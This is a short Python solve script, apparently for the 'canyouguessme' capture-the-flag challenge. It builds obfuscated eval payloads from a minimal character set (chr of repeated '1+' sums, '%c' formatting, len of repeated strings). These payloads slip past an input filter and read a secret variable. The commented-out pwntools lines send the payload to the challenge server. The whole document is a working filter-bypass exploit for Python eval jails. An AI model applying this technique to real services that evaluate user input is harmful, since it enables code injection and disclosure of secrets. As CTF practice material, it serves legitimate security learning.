from pwn import *



def encode(msg):
	msg = [ord(m) for m in msg]
	payload = ''
	for m in msg:
		payload += "chr(%s)" % (("1+"*m)[:-1])
		payload += "+"
	return payload[:-1]
def encode2(msg):
	msg = [ord(m) for m in msg]
	payload = ''
	for m in msg:
		payload += "'%%c'%%(%s)" % (("1+"*m)[:-1])
		payload += "+"
	return payload[:-1]

def encode3(msg):
	msg = [ord(m) for m in msg]
	payload = "'"
	for i in range(len(msg)):
		payload += '%'*(2**i) + 'c'
	payload += "'"
	for m in msg:
		payload += "%%len('%s')" % ("c"*m)
	return payload


payload = 'eval(%s)' % (encode3("secret_value_for_password"))
open("test",'w').write(payload)
# print payload
# s = remote("canyouguessme.pwni.ng",12349)

# s.recvuntil("Input value: ")
# s.sendline(payload)
# print s.recv()